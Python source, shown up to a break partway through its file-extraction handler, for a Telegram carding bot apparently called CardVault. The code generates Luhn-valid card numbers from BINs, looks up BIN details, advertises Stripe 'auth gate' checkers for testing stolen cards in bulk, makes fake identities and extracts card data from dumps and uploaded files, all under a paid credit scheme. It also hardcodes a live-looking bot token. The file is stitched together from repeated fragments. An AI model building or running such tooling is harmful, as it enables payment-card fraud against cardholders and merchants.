import os
import time
import logging
import asyncio
import aiohttp
import re
import psutil
import random
from datetime import datetime, timedelta
from db import get_user, update_user, init_db
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from telegram.error import BadRequest
from faker import Faker
import pytz
import uuid
from config import ADMIN_IDS


# === CONFIGURATION ===
# IMPORTANT: Hardcoded bot token and owner ID for direct use (no environment variables required)
TOKEN = "8392489510:AAGujPltw1BvXv9KZtolvgsZOc_lfVbTYwU"
OWNER_ID = 8406230162



# --- New Configuration ---
AUTHORIZATION_CONTACT = "@K4linuxx"
OFFICIAL_GROUP_LINK = "https://t.me/+gtvJT4SoimBjYjQ1"
DEFAULT_FREE_CREDITS = 200  # A non-expiring credit pool for free users

# === PERSISTENCE WARNING ===
# The following dictionaries store data in-memory and will be LOST when the bot
# is redeployed. For a production environment on Railway, you MUST replace
# this with a real database solution like PostgreSQL.
#
# A simple approach for your use case would be:
# 1. Add a `psycopg2` or `asyncpg` library to your requirements.txt.
# 2. Set up a PostgreSQL database on Railway.
# 3. Create functions to connect to the database and perform CRUD operations
#    (Create, Read, Update, Delete) on user data.
# 4. Replace `USER_DATA_DB` and `REDEEM_CODES` with calls to these database functions.
#
# --- GLOBAL STATE (In-Memory) ---
user_last_command = {}
AUTHORIZED_CHATS = set()
AUTHORIZED_PRIVATE_USERS = set()
REDEEM_CODES = {} # New dictionary to store redeem codes
USER_DATA_DB = {
    OWNER_ID: {
        'credits': 9999,
        'plan': 'PLUS',
        'status': 'Owner',
        'plan_expiry': 'N/A',
        'keys_redeemed': 0,
        'registered_at': '03-08-2025'
    }
}
# Initialize Faker
fake = Faker()

# === LOGGING SETUP ===
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# === HELPER FUNCTIONS ===
def escape_markdown_v2(text: str) -> str:
    """Escapes markdown v2 special characters."""
    special_chars = r"([_*\[\]()~`>#+\-=|{}.!])"
    return re.sub(special_chars, r"\\\1", text)

def get_level_emoji(level):
    level_lower = level.lower()
    if "gold" in level_lower:
        return "🌟"
    elif "platinum" in level_lower:
        return "💎"
    elif "premium" in level_lower:
        return "✨"
    elif "infinite" in level_lower:
        return "♾️"
    elif "corporate" in level_lower:
        return "💼"
    elif "business" in level_lower:
        return "📈"
    elif "standard" in level_lower or "classic" in level_lower:
        return "💳"
    return "💡"

def get_vbv_status_display(status):
    if status is True:
        return "✅ LIVE"
    elif status is False:
        return "❌ DEAD"
    else:
        return "🤷 N/A"

def luhn_checksum(card_number):
    """Checks if a credit card number is valid using the Luhn algorithm."""
    digits = [int(d) for d in card_number if d.isdigit()]
    total = 0
    num_digits = len(digits)
    parity = num_digits % 2
    for i, digit in enumerate(digits):
        if i % 2 == parity:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

from db import get_user, update_user  # your async DB functions
from datetime import datetime

DEFAULT_FREE_CREDITS = 200
DEFAULT_PLAN = "Free"
DEFAULT_STATUS = "Free"
DEFAULT_PLAN_EXPIRY = "N/A"
DEFAULT_KEYS_REDEEMED = 0

async def get_user_data(user_id):
    """
    Fetch user data from DB; if not exists, create with defaults then fetch.
    """
    user_data = await get_user(user_id)
    if not user_data:
        now_str = datetime.now().strftime('%d-%m-%Y')
        # Insert new user with defaults
        await update_user(
            user_id,
            credits=DEFAULT_FREE_CREDITS,
            plan=DEFAULT_PLAN,
            status=DEFAULT_STATUS,
            plan_expiry=DEFAULT_PLAN_EXPIRY,
            keys_redeemed=DEFAULT_KEYS_REDEEMED,
            registered_at=now_str
        )
        # Fetch again after insertion
        user_data = await get_user(user_id)
    return user_data


async def consume_credit(user_id: int) -> bool:
    """
    Deduct 1 credit if available. Return True if succeeded.
    """
    user_data = await get_user_data(user_id)
    if user_data and user_data.get('credits', 0) > 0:
        new_credits = user_data['credits'] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


async def add_credits_to_user(user_id: int, amount: int):
    """
    Add credits to user, creating user if needed.
    Return updated credits or None if failure.
    """
    user_data = await get_user_data(user_id)
    if not user_data:
        return None
    new_credits = user_data.get('credits', 0) + amount
    await update_user(user_id, credits=new_credits)
    return new_credits


async def get_bin_details(bin_number):
    bin_data = {
        "scheme": "N/A",         # Card brand (e.g., VISA, Mastercard)
        "type": "N/A",           # Credit/Debit
        "level": "N/A",          # Card level (e.g., Classic, Business)
        "bank": "N/A",           # Bank name
        "country_name": "N/A",   # Full country name
        "country_emoji": "",     # Country flag emoji
        "vbv_status": None,      # Placeholder, not provided by API
        "card_type": "N/A"       # Redundant with type, still kept
    }

    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json"
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=7) as response:
                if response.status == 200:
                    data = await response.json()
                    bin_data["scheme"] = data.get("brand", "N/A").upper()
                    bin_data["type"] = data.get("type", "N/A").title()
                    bin_data["card_type"] = data.get("type", "N/A").title()
                    bin_data["level"] = data.get("level", "N/A").title()
                    bin_data["bank"] = data.get("bank", "N/A").title()
                    bin_data["country_name"] = data.get("country_name", "N/A")
                    bin_data["country_emoji"] = data.get("country_flag", "")
                    return bin_data
                else:
                    logger.warning(f"Antipublic API returned status {response.status} for BIN {bin_number}")
    except aiohttp.ClientError as e:
        logger.warning(f"Antipublic API call failed for {bin_number}: {e}")
    except Exception as e:
        logger.warning(f"Error processing Antipublic response for {bin_number}: {e}")

    logger.warning(f"Failed to get BIN details for {bin_number} from antipublic.cc.")
    return bin_data

async def enforce_cooldown(user_id: int, update: Update) -> bool:
    """Enforces a 5-second cooldown per user."""
    current_time = time.time()
    last_command_time = user_last_command.get(user_id, 0)
    if current_time - last_command_time < 5:
        await update.effective_message.reply_text("⏳ Please wait 5 seconds before retrying\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return False
    user_last_command[user_id] = current_time
    return True

from config import OWNER_ID  # Ensure OWNER_ID is loaded from environment or config


# === CONFIG ===
# Only this group is authorized
AUTHORIZED_GROUP_ID = -1002554243871

# List of your bot commands
BOT_COMMANDS = [
    "/start", "/help", "/gen", "/bin", "/chk", "/mchk", "/mass",
    "/mtchk", "/fk", "/fl", "/open", "/status", "/credits", "/info"
]

from telegram.ext import ApplicationHandlerStop

async def group_filter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    message = update.effective_message

    # Only check in groups
    if chat.type in ["group", "supergroup"]:
        # If the group is NOT the authorized group
        if chat.id != AUTHORIZED_GROUP_ID:
            if message.text:
                cmd = message.text.split()[0].lower()
                if cmd in BOT_COMMANDS:
                    await message.reply_text(
                        f"🚫 This group is not authorized to use this bot.\n\n"
                        f"📩 Contact {AUTHORIZATION_CONTACT} to get access.\n"
                        f"🔗 Official group: {OFFICIAL_GROUP_LINK}"
                    )
                    # Stop other handlers from running
                    raise ApplicationHandlerStop
    # In private or the authorized group → do nothing, commands continue

# --- GLOBAL STATE ---
user_last_command = {}
AUTHORIZED_CHATS = set()  # Add your authorized group IDs here

BOT_COMMANDS = [
    "start", "help", "gen", "bin", "chk", "mchk", "mass",
    "mtchk", "fk", "fl", "open", "status", "credits", "info"
]

from telegram.ext import ApplicationHandlerStop, filters

async def group_filter(update, context):
    chat = update.effective_chat
    message = update.effective_message

    # Only check commands in groups
    if chat.type in ["group", "supergroup"]:
        if chat.id not in AUTHORIZED_CHATS:
            # Check if the message contains a command
            if message.entities:
                for ent in message.entities:
                    if ent.type == "bot_command":
                        # Extract command without the "/"
                        cmd_text = message.text[ent.offset+1 : ent.offset+ent.length].split("@")[0].lower()
                        if cmd_text in BOT_COMMANDS:
                            await message.reply_text(
                                f"🚫 This group is not authorized to use this bot.\n\n"
                                f"📩 Contact {AUTHORIZATION_CONTACT} to get access.\n"
                                f"🔗 Official group: {OFFICIAL_GROUP_LINK}"
                            )
                            # Stop other handlers (so the command is not executed)
                            raise ApplicationHandlerStop
    # Private chats or authorized groups → do nothing


# safe_start.py — Optimized /start handler with final profile card
from datetime import datetime
import logging
import pytz
import re

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from db import get_user  # keep your existing function

# Links
BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"
OFFICIAL_GROUP_LINK = "https://t.me/CARDER33"
DEV_LINK = "https://t.me/k4linuxx"

logger = logging.getLogger(__name__)

# ---------- Utilities ----------
def escape_all_markdown(text: str) -> str:
    """Escape all MarkdownV2 special characters."""
    special_chars = r"[_*\[\]()~`>#+-=|{}.!%]"
    return re.sub(special_chars, r"\\\g<0>", str(text))


def build_final_card(*, user_id: int, username: str | None, credits: int, plan: str, date_str: str, time_str: str) -> str:
    uname = f"@{username}" if username else "N/A"
    bullet = f"\[[₰]({BULLET_GROUP_LINK})\]"

    return (
        "✦━━━━━━━━━━━━━━✦\n"
        "   ⚡ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        f"{bullet} ID      : `{escape_all_markdown(str(user_id))}`\n"
        f"{bullet} Username: `{escape_all_markdown(uname)}`\n"
        f"{bullet} Credits : `{credits}`\n"
        f"{bullet} Plan    : `{escape_all_markdown(plan)}`\n"
        f"{bullet} Date    : `{date_str}`\n"
        f"{bullet} Time    : `{time_str}`\n\n"
        "⮞ 𝐔𝐬𝐞 𝐭𝐡𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐛𝐞𝐥𝐨𝐰 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞👇"
    )


async def get_user_cached(user_id, context):
    """Get user profile with caching (faster)."""
    if "profile" in context.user_data:
        return context.user_data["profile"]
    user_data = await get_user(user_id)
    context.user_data["profile"] = user_data
    return user_data


def get_main_keyboard():
    """Reusable main inline keyboard."""
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("𝐆𝐚𝐭𝐞𝐬 🚪", callback_data="gates_menu"),
            InlineKeyboardButton("𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 ⌨️", callback_data="tools_menu")
        ],
        [
            InlineKeyboardButton("𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐆𝐫𝐨𝐮𝐩 👥", url=OFFICIAL_GROUP_LINK),
            InlineKeyboardButton("𝗢𝘄𝗻𝗲𝗿 💎", url=DEV_LINK)
        ]
    ])


async def build_start_message(user, context):
    """Build profile card text and keyboard."""
    tz = pytz.timezone("Asia/Kolkata")
    now_dt = datetime.now(tz)
    date_str = now_dt.strftime("%d-%m-%Y")
    time_str = now_dt.strftime("%I:%M %p")

    user_data = await get_user_cached(user.id, context)
    credits = int(user_data.get("credits", 0))
    plan = str(user_data.get("plan", "Free"))

    text = build_final_card(
        user_id=user.id,
        username=user.username,
        credits=credits,
        plan=plan,
        date_str=date_str,
        time_str=time_str,
    )

    return text, get_main_keyboard()

# ---------- /start handler ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logger.info(f"/start by {user.id} (@{user.username})")

    text, keyboard = await build_start_message(user, context)

    msg = update.message or update.effective_message
    await msg.reply_text(
        text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=keyboard,
        disable_web_page_preview=True,
    )

# ---------- Callback Query Handlers ----------
async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"
    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "   ⚡ 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 ⚡\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        f"{bullet_link} `/start` – Welcome message\n"
        f"{bullet_link} `/help` – Shows all commands\n"
        f"{bullet_link} `/gen` `[bin]` `[no\\. of cards]` Gen\n"
        f"{bullet_link} `/bin` `<bin>` – BIN lookup\n"
        f"{bullet_link} `/chk` `cc|mm|yy|cvv` – Stripe Auth\n"
        f"{bullet_link} `/mchk` – x10 Multi Stripe\n"
        f"{bullet_link} `/mass` – x30 Mass Stripe Auth 2\n"
        f"{bullet_link} `/mtchk` `txt file` – x200 Stripe Auth 3\n"
        f"{bullet_link} `/fk` – Generate fake identity info\n"
        f"{bullet_link} `/fl` `<dump>` – Fetch CCs from dump\n"
        f"{bullet_link} `/open` – Extracts cards from a file\n"
        f"{bullet_link} `/status` – Bot system status info\n"
        f"{bullet_link} `/credits` – Chk remaining credits\n"
        f"{bullet_link} `/info` – Shows your user info\n\n"
    )

    keyboard = [[InlineKeyboardButton("◀️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", callback_data="back_to_start")]]
    await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN_V2,
                              reply_markup=InlineKeyboardMarkup(keyboard),
                              disable_web_page_preview=True)


from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# ----------------- Gates Menu -----------------
async def gates_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    auth_message = (
        "✦━━━━━━━━━━━━━━✦\n"
        "   🚪 𝐆𝐚𝐭𝐞𝐬 𝐌𝐞𝐧𝐮\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "✨ Please select a feature below:\n\n"
    )

    auth_keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("⚡ 𝐀𝐮𝐭𝐡", callback_data="auth_sub_menu"),
            InlineKeyboardButton("💳 𝐂𝐡𝐚𝐫𝐠𝐞", callback_data="charge_sub_menu")
        ],
        [InlineKeyboardButton("◀️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", callback_data="back_to_start")]
    ])

    await q.edit_message_text(auth_message,
                              parse_mode=ParseMode.MARKDOWN_V2,
                              reply_markup=auth_keyboard,
                              disable_web_page_preview=True)


# ----------------- Auth Submenu -----------------
async def auth_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    gates_message = (
        "✦━━━━━━━━━━━━━━✦\n"
        "     🚪 𝐀𝐮𝐭𝐡 𝐆𝐚𝐭𝐞\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "✨ Select a platform below:\n"
    )

    keyboard = [
        [InlineKeyboardButton("💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛", callback_data="stripe_examples")],
        [InlineKeyboardButton("◀️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", callback_data="back_to_start")]
    ]

    await q.edit_message_text(gates_message,
                              parse_mode=ParseMode.MARKDOWN_V2,
                              reply_markup=InlineKeyboardMarkup(keyboard),
                              disable_web_page_preview=True)


# ----------------- Stripe Examples Submenu -----------------
async def stripe_examples_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    examples_message = (
        "✦━━━━━━━━━━━━━━✦\n"
        "     💳 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "• `/chk` \\- *Check a single card*\n"
        "  Example:\n"
        "  `\\/chk 1234567890123456\\|12\\|24\\|123`\n\n"
        "• `/mchk` \\- *Check up to 10 cards at once*\n"
        "  Example:\n"
        "  `\\/mchk 1234567890123456\\|\\.\\.\\. \\# up to 10 cards`\n\n"
        "• `/mass` \\- *Check up to 30 cards at once*\n"
        "  Example:\n"
        "  `\\/mass <cards>`\n"
    )

    keyboard = [
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗚𝗔𝗧𝗘 𝗠𝗘𝗡𝗨", callback_data="auth_sub_menu")],
        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", callback_data="back_to_start")]
    ]

    await q.edit_message_text(examples_message,
                              parse_mode=ParseMode.MARKDOWN_V2,
                              reply_markup=InlineKeyboardMarkup(keyboard),
                              disable_web_page_preview=True)


# ----------------- Charge Submenu -----------------
async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    text = (
        "✦━━━━━━━━━━━━━━✦\n"
        "      ⚡ 𝐂𝐡𝐚𝐫𝐠𝐞 𝐆𝐚𝐭𝐞 ⚡\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        "🚧 𝐓𝐡𝐢𝐬 𝐠𝐚𝐭𝐞 𝐢𝐬 𝐮𝐧𝐝𝐞𝐫 𝐦𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞\n"
        "🔄 𝐒𝐨𝐨𝐧 𝐨𝐩𝐞𝐧𝐞𝐝\n\n"
        "✅ 𝐔𝐧𝐭𝐢𝐥 𝐭𝐡𝐞𝐧, 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐮𝐬𝐞:\n"
        "   ➤ 🚪 𝐀𝐮𝐭𝐡 𝐆𝐚𝐭𝐞"
    )

    keyboard = [[InlineKeyboardButton("◀️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", callback_data="back_to_start")]]

    await q.edit_message_text(text,
                              parse_mode=ParseMode.MARKDOWN_V2,
                              reply_markup=InlineKeyboardMarkup(keyboard),
                              disable_web_page_preview=True)


# ----------------- Back to Main Menu -----------------
async def start_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Back to main menu (reuses start message)."""
    user = update.effective_user
    text, keyboard = await build_start_message(user, context)

    await update.callback_query.edit_message_text(text,
                                                  parse_mode=ParseMode.MARKDOWN_V2,
                                                  reply_markup=keyboard,
                                                  disable_web_page_preview=True)


# ----------------- Callback Router -----------------
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    if data == "tools_menu":
        await show_tools_menu(update, context)
    elif data == "gates_menu":
        await gates_menu_handler(update, context)
    elif data == "auth_sub_menu":
        await auth_sub_menu_handler(update, context)
    elif data == "charge_sub_menu":
        await charge_sub_menu_handler(update, context)
    elif data == "stripe_examples":
        await stripe_examples_handler(update, context)
    elif data == "back_to_start":
        await start_menu_handler(update, context)
    else:
        await q.answer("Unknown option.", show_alert=True)





from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows the bot's help menu with a list of commands."""
    
    bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"
    
    help_message = (
        "╭━━━[ 🤖 *Help Menu* ]━━━⬣\n"
        f"{bullet_link} `/start` \\- Welcome message\n"
        f"{bullet_link} `/help` \\- Shows this help message\n"
        f"{bullet_link} `/gen [bin] [no\\. of cards]` \\- Generate cards from BIN\n"
        f"{bullet_link} `/bin <bin>` \\- BIN lookup \\(bank, country, type\\)\n"
        f"{bullet_link} `/fk <country>` \\- Generate fake identity info\n"
        f"{bullet_link} `/fl <dump>` \\- Extracts cards from dumps\n"
        f"{bullet_link} `/open` \\- Extracts cards from a text file\n"
        f"{bullet_link} `/status` \\- Bot system status info\n"
        f"{bullet_link} `/credits` \\- Check your remaining credits\n"
        f"{bullet_link} `/info` \\- Shows your user info\n"
        f"{bullet_link} `/chk` \\- Checks card on Stripe Auth\n"
        f"{bullet_link} `/mchk` \\- Checks up to 10 cards on Stripe Auth\n"
        f"{bullet_link} `/mtchk` \\- Checks a txt file upto 200 cards on Stripe Auth\n"
        f"{bullet_link} `/mass` \\- Checks up to 30 cards on Stripe Auth\n"
    )

    await update.effective_message.reply_text(
        help_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True  # This prevents the link preview
    )


from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows the user's detailed information."""
    user = update.effective_user
    user_data = await get_user(user.id)
    
    # Define the bullet point with the hyperlink
    bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"

    # Escape all dynamic values
    first_name = escape_markdown_v2(user.first_name or 'N/A')
    user_id = escape_markdown_v2(str(user.id))
    username = escape_markdown_v2(user.username or 'N/A')
    status = escape_markdown_v2(user_data.get('status', 'N/A'))
    credits = escape_markdown_v2(str(user_data.get('credits', 0)))
    plan = escape_markdown_v2(user_data.get('plan', 'N/A'))
    plan_expiry = escape_markdown_v2(user_data.get('plan_expiry', 'N/A'))
    keys_redeemed = escape_markdown_v2(str(user_data.get('keys_redeemed', 0)))
    registered_at = escape_markdown_v2(user_data.get('registered_at', 'N/A'))

    info_message = (
        "🔍 *Your Info on 𝑪𝒂𝒓𝒅𝑽𝒂𝒖𝒍𝒕✘* ⚡\n"
        "━━━━━━━━━━━━━━\n"
        f"{bullet_link}  𝙁𝙞𝙧𝙨𝙩 𝙉𝙖𝙢𝙚: `{first_name}`\n"
        f"{bullet_link}  𝙄𝘿: `{user_id}`\n"
        f"{bullet_link}  𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{username}\n\n"
        f"{bullet_link}  𝙎𝙩𝙖𝙩𝙪𝙨: `{status}`\n"
        f"{bullet_link}  𝘾𝙧𝙚𝙙𝙞𝙩: `{credits}`\n"
        f"{bullet_link}  𝙋𝙡𝙖𝙣: `{plan}`\n"
        f"{bullet_link}  𝙋𝙡𝙖𝙣 𝙀𝙭𝙥𝙞𝙧𝙮: `{plan_expiry}`\n"
        f"{bullet_link}  𝙆𝙚𝙮𝙨 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙: `{keys_redeemed}`\n"
        f"{bullet_link}  𝙍𝙚𝙜𝙞𝙨𝙩𝙚𝙧𝙚𝙙 𝘼𝙩: `{registered_at}`\n"
    )

    await update.message.reply_text(
        info_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )




from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telegram.helpers import escape_markdown as escape_markdown_v2
import random, io
from datetime import datetime

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates cards from a given BIN/sequence."""
    
    user = update.effective_user
    if not await enforce_cooldown(user.id, update):
        return

    user_data = await get_user(user.id)
    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Get input
    if context.args:
        raw_input = context.args[0]
    else:
        raw_input = None

    if not raw_input:
        return await update.effective_message.reply_text(
            escape_markdown_v2(
                "❌ Please provide BIN or sequence (at least 6 digits).\n"
                "Usage:\n`/gen 414740`\n`/gen 445769 20`\n`/gen 414740|11|2028|777`"
            ),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Split possible parts
    parts = raw_input.split("|")
    card_base = parts[0].strip()
    extra_mm = parts[1].zfill(2) if len(parts) > 1 and parts[1].isdigit() else None
    extra_yyyy = parts[2] if len(parts) > 2 and parts[2].isdigit() else None
    extra_cvv = parts[3] if len(parts) > 3 and parts[3].isdigit() else None

    if not card_base.isdigit() or len(card_base) < 6:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ BIN/sequence must be at least 6 digits."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Determine number of cards
    num_cards = 10  # default
    send_as_file = False

    if len(context.args) > 1 and context.args[1].isdigit():
        num_cards = int(context.args[1])
        send_as_file = True  # send as file only if user specifies number

    # Consume 1 credit
    if not await consume_credit(user.id):
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # BIN lookup
    bin_details = await get_bin_details(card_base[:6])
    brand = bin_details.get("scheme", "Unknown")
    bank = bin_details.get("bank", "Unknown")
    country_name = bin_details.get("country_name", "Unknown")
    country_emoji = bin_details.get("country_emoji", "")

    # Determine card length
    card_length = 15 if "american express" in brand.lower() or "amex" in brand.lower() else 16

    # Generate cards
    cards = []
    attempts = 0
    max_attempts = num_cards * 100
    while len(cards) < num_cards and attempts < max_attempts:
        attempts += 1
        suffix_len = card_length - len(card_base)
        if suffix_len < 0:
            break

        card_number = card_base + ''.join(str(random.randint(0, 9)) for _ in range(suffix_len))
        if not luhn_checksum(card_number):
            continue

        mm = extra_mm or str(random.randint(1, 12)).zfill(2)
        yyyy = extra_yyyy or str(datetime.now().year + random.randint(1, 5))
        cvv = extra_cvv or (str(random.randint(0, 9999)).zfill(4) if card_length == 15 else str(random.randint(0, 999)).zfill(3))

        cards.append(f"{card_number}|{mm}|{yyyy[-2:]}|{cvv}")

    # BIN info block
    escaped_bin_info = (
        f"╭━━━[ 💳 *𝐆𝐞𝐧 𝐈𝐧𝐟𝐨* ]━━━⬣\n"
        f"┣ ❏ 𝐁𝐈𝐍 ➳ `{escape_markdown_v2(card_base)}`\n"
        f"┣ ❏ 𝐁𝐫𝐚𝐧𝐝 ➳ `{escape_markdown_v2(brand)}`\n"
        f"┣ ❏ 𝐁𝐚𝐧𝐤 ➳ `{escape_markdown_v2(bank)}`\n"
        f"┣ ❏ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ `{escape_markdown_v2(country_name)}`{escape_markdown_v2(country_emoji)}\n"
        f"╰━━━━━━━━━━━━━━━━━━⬣"
    )

    if send_as_file:
        file_content = "\n".join(cards)
        file = io.BytesIO(file_content.encode('utf-8'))
        file.name = f"generated_cards_{card_base}.txt"
        await update.effective_message.reply_document(
            document=file,
            caption=f"*Generated {len(cards)} Cards 💳*\n\n{escaped_bin_info}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        cards_list = "\n".join(f"`{c}`" for c in cards)
        final_message = f"*Generated {len(cards)} Cards 💳*\n\n{cards_list}\n\n{escaped_bin_info}"
        await update.effective_message.reply_text(
            final_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )



import re
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import io
from telegram.helpers import escape_markdown as escape_markdown_v2

# These are placeholder functions. You will need to define the actual
# logic for them elsewhere in your codebase.
async def get_user(user_id):
    """Placeholder function to retrieve user data, e.g., from a database."""
    # Returning dummy data for the purpose of a runnable example.
    return {
        'status': 'Active',
        'credits': 100,
        'plan': 'Free Tier',
        'plan_expiry': 'N/A',
        'keys_redeemed': 2,
        'registered_at': '2025-01-01'
    }

async def update_user(user_id, **kwargs):
    """Placeholder function to update user data, e.g., deducting credits."""
    print(f"User {user_id} updated with {kwargs}")
    return True

async def enforce_cooldown(user_id, update):
    """Placeholder function to enforce command cooldowns."""
    # You can implement your cooldown logic here.
    # For now, we will return True to allow the command to proceed.
    return True

async def open_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Extracts credit cards from an uploaded text file, or from a file
    in a replied-to message, with a maximum limit of 100 cards.
    A single credit is deducted per command use.
    """
    # The authorization check has been removed, so all users can access this command.

    user = update.effective_user
    if not await enforce_cooldown(user.id, update):
        return

    # Fetch user data to check credits
    user_data = await get_user(user.id)
    # Check for at least 1 credit to run the command
    if not user_data or user_data.get('credits', 0) <= 0:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check for a replied-to message with a document
    if update.effective_message.reply_to_message and update.effective_message.reply_to_message.document:
        document = update.effective_message.reply_to_message.document
    # Fallback to checking the current message for a document
    elif update.effective_message.document:
        document = update.effective_message.document
    else:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Please reply to a txt file with the command or attach a txt file with the command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check if the file is a text file
    if document.mime_type != 'text/plain':
        return await update.effective_message.reply_text(escape_markdown_v2("❌ The file must be a text file (.txt)."), parse_mode=ParseMode.MARKDOWN_V2)

    # Deduct a single credit for the command
    await update_user(user.id, credits=user_data['credits'] - 1)

    # Get the file and download its content
    try:
        file_obj = await document.get_file()
        file_content_bytes = await file_obj.download_as_bytearray()
        file_content = file_content_bytes.decode('utf-8')
    except Exception as e:
        return await update.effective_message.reply_text(escape_markdown_v2(f"❌ An error occurred while reading the file: {e}"), parse_mode=ParseMode.MARKDOWN_V2)

    # Regex to find credit card patterns
    card_pattern = re.compile(r'(\d{13,16}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    
    # Find all matches
    found_cards = card_pattern.findall(file_content)
    
    # Check if the number of cards exceeds the 100 limit
    if len(found_cards) > 100:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ The maximum number of cards allowed to open is 100. Please upload a smaller file."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if not found_cards:
